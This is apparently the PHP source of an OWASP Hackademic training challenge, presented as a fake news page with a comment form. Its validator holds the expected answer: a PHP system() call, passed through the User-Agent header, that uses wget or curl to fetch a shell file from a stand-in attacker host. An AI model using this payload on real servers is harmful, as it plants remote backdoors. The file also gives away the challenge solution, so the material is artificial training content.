<?php

/**
 *    ----------------------------------------------------------------
 *    OWASP Hackademic Challenges Project
 *    ----------------------------------------------------------------
 *    Copyright (C) 2010-2011
 *   	  Andreas Venieris [venieris@owasp.gr]
 *   	  Anastasios Stasinopoulos [anast@owasp.gr]
 *    ----------------------------------------------------------------
 */

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" >
<title>Challenge 009 - SlaggOFF</title>
<center><img src="slagoff.png"></center>
</head>
<style>
a{
color:lime;
}
</style>
</head>
<hr>
<body style="background-color: black; color: rgb(0, 0, 0);">
<div style="text-align: left; color: white;"><big style="font-family: Arial;">
<big><big>The Police have arrested a team of 20 hackers.<br>
<small><small><font color=yellow>Comment by Admin, 14 June, 2010 </font><br><br>

<small>
The Police have arrested a team of 20 hackers, belonging to a certain hacker group, who were trying to clone bank websites, in an attempt to intercept bank account numbers belonging to people from foreign countries. According to the Police Force Chief who was in charge of the operation, several people in Italy and Spain have become victims of the aforementioned fraud, as they entered their bank account details to the spurious site. What is more, the hackers had accomplices in these two countries, who withdrew the money that adds up to several hundreds of thousands Euros.

One more hacker, member of the same hacker group, has been arrested for obtaining illegal access to the servers of several US universities and state organisations, such as NASA, using an american IP address to disguise himself. There is nothing surprising here really, as this hacker group is now regarded as being an international threat, since they have repeatedly struck multiple targets.

One of their most important attacks was when they tampered with the data stored in the database of an american trade company, thus managing to steal several tens of millions records related to its customers.
<hr>
<small><br>
<font color=red> Enter your comment:</font><br>
</small></small></big>
<br>
<?php
error_reporting(0);
$shiz = $_REQUEST['source'];
$page = $_REQUEST['page'];

include_once dirname(__FILE__).'/../../init.php';
session_start();
require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");

$solution = new RegexSolution(RegexSolution::PHP_BEGIN.'system\("(wget|curl) http:\/\/www.really_nasty_hacker.com\/shell.txt"\)'.RegexSolution::PHP_END);
$validator = new ChallengeValidatorController($solution);
$validator->startChallenge();

if(!isset($shiz) && !isset($page)) {

?>
<form method="GET" action="'.$_SERVER['PHP_SELF'].'">
	<font color=yellow>Name:</font><br>
	<input type="text" name="name"><br>
	<font color=yellow>Last Name:</font><br>
	<input type="text" name="surname"><br>
	<font color=yellow>Comment:</font><br>
	<textarea name="source" cols="60" rows="15"></textarea>
	<br/>
	<input type="submit" value="Send">
	<input type="hidden" value="answer.php" name="page">
</form>

<?php

} else if ($page == 'answer.php') {
	$answer = $_SERVER['HTTP_USER_AGENT'];
	$valid = $validator->validateSolution($answer);
	if ($valid) {
		echo 'The backdoor shell has been successfully installed in target. For security reasones renamed automaticaly to tyj0rL.php</font>';
	} else {
		echo '<font face="arial" size="3">The registration of your comment was completed with success!<br> In order to be "viewable" should first becomes acceptable from the administration team of the SlagOFF.com';
	}
}

?>
<hr>
<center>
</center>
</body>
</html>